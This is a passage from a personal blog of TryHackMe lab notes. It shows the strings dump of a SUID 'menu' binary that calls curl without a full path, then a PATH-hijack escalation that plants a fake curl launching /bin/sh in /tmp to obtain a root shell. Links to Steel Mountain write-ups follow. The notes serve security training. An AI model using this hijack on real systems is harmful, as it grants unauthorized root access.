2014 /bin/ping6</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/bin/menu</span><br><span class="line"></span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">setuid</span><br><span class="line">__isoc99_scanf</span><br><span class="line">puts</span><br><span class="line">__stack_chk_fail</span><br><span class="line">printf</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.7</span><br><span class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">UH-`</span><br><span class="line">AWAVA</span><br><span class="line">AUATL</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">***************************************</span><br><span class="line">1. status check</span><br><span class="line">2. kernel version</span><br><span class="line">3. ifconfig</span><br><span class="line">** Enter your choice :</span><br><span class="line">curl -I localhost                              //this is want we want</span><br><span class="line">uname -r</span><br><span class="line">ifconfig</span><br><span class="line"> Invalid choice</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609</span><br><span class="line">crtstuff.c</span><br><span class="line">__JCR_LIST__</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.7594</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">menu.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__JCR_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">puts@@GLIBC_2.2.5</span><br><span class="line">_edata</span><br><span class="line">__stack_chk_fail@@GLIBC_2.4</span><br><span class="line">system@@GLIBC_2.2.5</span><br><span class="line">printf@@GLIBC_2.2.5</span><br><span class="line">__libc_start_main@@GLIBC_2.2.5</span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">__isoc99_scanf@@GLIBC_2.7</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid@@GLIBC_2.2.5</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.jcr</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo /bin/sh &gt; curl</span><br><span class="line">chmod 777 curl </span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/usr/bin/menu</span><br></pre></td></tr></table></figure>

<h1 id="Steel-Mountain"><a href="#Steel-Mountain" class="headerlink" title="Steel Mountain"></a>Steel Mountain</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.youtube.com/watch?v=BzmljZkgeSs</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://overide.medium.com/steel-mountain-tryhackme-writeup-c184e6677742</span><br><span class="line"></span><br><span class="line">https://infosecwriteups.com/tryhackme-writeup-steel-mountain-d052141f8901</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yake-daigua.top">yake-daigua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yake-daigua.top/2022/12/04/TryHackMe_1/">https://yake-daigua.top/2022/12/04/TryHackMe_1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yake-daigua.top" target="_blank">yake-daigua</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PEN/">PEN</a><a class="post-meta__tags" href="/tags/THM/">THM</a></div><div class="post_share"><div class="social-share" data-image="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/25/HTTP2%20request%20smuggling/"><img class="next-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTTP2 request smuggling</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="author-info__name">yake-daigua</div><div class="author-info__description">爱蜜莉雅,我好喜欢你</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yake-daigua"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到yake-daigua的Blog，不定期更新技术总结文章和个人阶段性学习成果。加油啊，敲键盘的大哥哥。<img src="/img/loading.gif" data-original="https://npm.arcitcgn.cn/aciano-cdn@1.0.10/Yay.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Complete-Beginner-Introduction"><span class="toc-number">1.</span> <span class="toc-text">Complete Beginner Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tutorial"><span class="toc-number">1.0.1.</span> <span class="toc-text">Tutorial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Starting-Out-In-Cyber-Sec"><span class="toc-number">1.0.2.</span> <span class="toc-text">Starting Out In Cyber Sec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Introductory-Researching"><span class="toc-number">1.0.3.</span> <span class="toc-text">Introductory Researching</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-Fundamentals"><span class="toc-number">2.</span> <span class="toc-text">Linux Fundamentals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Fundamentals-Part-1"><span class="toc-number">2.0.1.</span> <span class="toc-text">Linux Fundamentals Part 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Fundamentals-Part-2"><span class="toc-number">2.0.2.</span> <span class="toc-text">Linux Fundamentals Part 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Fundamentals-Part-3"><span class="toc-number">2.0.3.</span> <span class="toc-text">Linux Fundamentals Part 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Regular-expressions"><span class="toc-number">2.0.4.</span> <span class="toc-text">Regular expressions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-Scripting"><span class="toc-number">2.0.5.</span> <span class="toc-text">Bash Scripting</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Network-Exploitation-Basics"><span class="toc-number">3.</span> <span class="toc-text">Network Exploitation Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Introductory-Networking"><span class="toc-number">3.0.1.</span> <span class="toc-text">Introductory Networking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">3.0.2.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Network-Services"><span class="toc-number">3.0.3.</span> <span class="toc-text">Network Services</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Network-Services2"><span class="toc-number">3.0.4.</span> <span class="toc-text">Network Services2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Hacking-Fundamentals"><span class="toc-number">4.</span> <span class="toc-text">Web Hacking Fundamentals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP"><span class="toc-number">4.0.1.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Burp-Suite"><span class="toc-number">4.0.2.</span> <span class="toc-text">Burp Suite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OWASP-Top-10"><span class="toc-number">4.0.3.</span> <span class="toc-text">OWASP Top 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pickle-Rick"><span class="toc-number">4.0.4.</span> <span class="toc-text">Pickle Rick</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cryptography"><span class="toc-number">5.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashing-Crypto-101"><span class="toc-number">5.0.1.</span> <span class="toc-text">Hashing-Crypto 101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#John-The-Ripper"><span class="toc-number">5.0.2.</span> <span class="toc-text">John The Ripper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encyption-Crypto-101"><span class="toc-number">5.0.3.</span> <span class="toc-text">Encyption-Crypto 101</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Exploitation-Basics"><span class="toc-number">6.</span> <span class="toc-text">Windows Exploitation Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">6.0.1.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Directory-Basics"><span class="toc-number">6.0.2.</span> <span class="toc-text">Active Directory Basics</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit"><span class="toc-number">7.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-Introduction"><span class="toc-number">7.0.1.</span> <span class="toc-text">Metasploit : Introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-Exploitation"><span class="toc-number">7.0.2.</span> <span class="toc-text">Metasploit : Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-Meterpreter"><span class="toc-number">7.0.3.</span> <span class="toc-text">Metasploit : Meterpreter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BLUE"><span class="toc-number">7.0.4.</span> <span class="toc-text">BLUE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shells-and-Privilege-Escalation"><span class="toc-number">8.</span> <span class="toc-text">Shells and Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shell"><span class="toc-number">8.0.1.</span> <span class="toc-text">Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat"><span class="toc-number">8.0.1.1.</span> <span class="toc-text">Netcat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Socat"><span class="toc-number">8.0.1.2.</span> <span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Common-Shell-Payloads"><span class="toc-number">8.0.1.3.</span> <span class="toc-text">Common Shell Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Msfvenom"><span class="toc-number">8.0.1.4.</span> <span class="toc-text">Msfvenom</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-multi-x2F-handler"><span class="toc-number">8.0.1.5.</span> <span class="toc-text">Metasploit multi&#x2F;handler</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Common-Linux-Privesc"><span class="toc-number">8.0.2.</span> <span class="toc-text">Common Linux Privesc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SUID-x2F-GUID"><span class="toc-number">8.0.2.1.</span> <span class="toc-text">SUID&#x2F;GUID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x2F-etc-x2F-passwd"><span class="toc-number">8.0.2.2.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Escaping-Vi-Editor"><span class="toc-number">8.0.2.3.</span> <span class="toc-text">Escaping Vi Editor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Crontab"><span class="toc-number">8.0.2.4.</span> <span class="toc-text">Crontab</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PATH"><span class="toc-number">8.0.2.5.</span> <span class="toc-text">PATH</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-PrivEsc"><span class="toc-number">8.0.3.</span> <span class="toc-text">Linux PrivEsc ***</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#kenobi"><span class="toc-number">9.</span> <span class="toc-text">kenobi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Steel-Mountain"><span class="toc-number">10.</span> <span class="toc-text">Steel Mountain</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="TryHackMe_1"/></a><div class="content"><a class="title" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1">TryHackMe_1</a><time datetime="2022-12-04T12:08:57.000Z" title="发表于 2022-12-04 20:08:57">2022-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP2 request smuggling"/></a><div class="content"><a class="title" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling">HTTP2 request smuggling</a><time datetime="2022-11-25T04:12:08.000Z" title="发表于 2022-11-25 12:12:08">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP走私靶场"/></a><div class="content"><a class="title" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场">HTTP走私靶场</a><time datetime="2022-11-16T14:33:49.000Z" title="发表于 2022-11-16 22:33:49">2022-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/11/SQLI/" title="SQL注入"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2022/11/11/SQLI/" title="SQL注入">SQL注入</a><time datetime="2022-11-11T08:20:21.000Z" title="发表于 2022-11-11 16:20:21">2022-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/2193933.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="浅析NodeJS"/></a><div class="content"><a class="title" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS">浅析NodeJS</a><time datetime="2022-11-02T11:35:18.000Z" title="发表于 2022-11-02 19:35:18">2022-11-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'TieUOuIwaBZb4edJcJ1C02ka-gzGzoHsz',
      appKey: 'eJRGo87LLpxMlIWKemPvjBtH',
      avatar: 'monsterid',
      serverURLs: 'https://tieuouiw.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://yake-daigua.top/2022/12/04/TryHackMe_1/'
    this.page.identifier = '/2022/12/04/TryHackMe_1/'
    this.page.title = 'TryHackMe_1'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/js/upjiang.js"></script><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>